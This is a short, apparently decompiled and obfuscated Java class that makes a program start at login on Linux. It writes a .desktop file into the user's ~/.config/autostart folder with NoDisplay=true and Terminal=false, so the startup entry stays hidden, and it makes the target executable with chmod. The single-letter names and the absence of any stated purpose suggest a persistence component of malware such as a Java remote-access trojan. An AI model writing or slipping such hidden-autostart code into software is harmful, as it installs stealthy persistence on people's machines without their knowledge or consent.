package b;

import java.io.File;
import java.io.FileWriter;
import java.io.PrintWriter;

public final class d extends a {
   public d(String var1, String var2, boolean var3) {
      super(var1, var2, var3);
   }

   private static File b() {
      String var0 = System.getProperty("user.home");
      return new File(var0 + "/.config/autostart/");
   }

   public final void a() {
      if (!b().exists()) {
         b().mkdirs();
      }

      File var1 = new File(b(), super.b + ".desktop");
      PrintWriter var2;
      (var2 = new PrintWriter(new FileWriter(var1))).println("[Desktop Entry]");
      var2.println("Type=Application");
      var2.println("Name=" + super.b);
      if (this.a) {
         var2.println("Exec=java -jar '" + super.c + "'");
      } else {
         var2.println("Exec=" + super.c);
      }

      var2.println("Terminal=false");
      var2.println("NoDisplay=true");
      var2.close();
      String[] var3 = new String[]{"chmod", "+x", super.c};
      Runtime.getRuntime().exec(var3);
   }
}
